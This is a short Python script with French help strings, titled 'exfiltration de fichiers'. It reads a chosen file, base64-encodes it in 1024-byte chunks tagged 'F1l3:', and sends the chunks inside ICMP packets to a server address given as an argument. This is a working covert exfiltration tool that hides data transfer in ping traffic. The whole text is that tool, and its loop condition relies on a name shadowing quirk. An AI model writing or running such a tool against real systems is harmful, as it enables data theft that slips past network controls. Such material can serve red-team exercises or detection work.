#!/usr/bin/python3
from scapy.all import *
import base64
import argparse
parser = argparse.ArgumentParser(description="exfiltration de fichiers")
parser.add_argument('-a','--address', help='adresse du serveur auquel envoyer le fichier',dest='ip',type=str)
parser.add_argument('-f','--file', help='nom du fichier à envoyer',dest='file',type=str)
parser.add_argument('-o','--output-file', help='nom du fichier à créer sur le serveur',dest='out',type=str)

args = parser.parse_args()
if not args.ip or not args.file or not args.out:
    parser.print_help()
    exit(1)
filename = args.file
ip= args.ip
out=base64.b64encode(b'F1l3' + b':' + args.out.encode())
send(IP(dst=ip)/ICMP()/Raw(out))
fichier=open(filename,'rb')
s=conf.L3socket()
while bytes:
    bytes=fichier.read(1024)
    message=base64.b64encode(b'F1l3' + b':') + base64.b64encode(bytes)
    destination=IP(dst=ip)/ICMP()/Raw(message)
    s.send(destination)
s.close()
fichier.close()
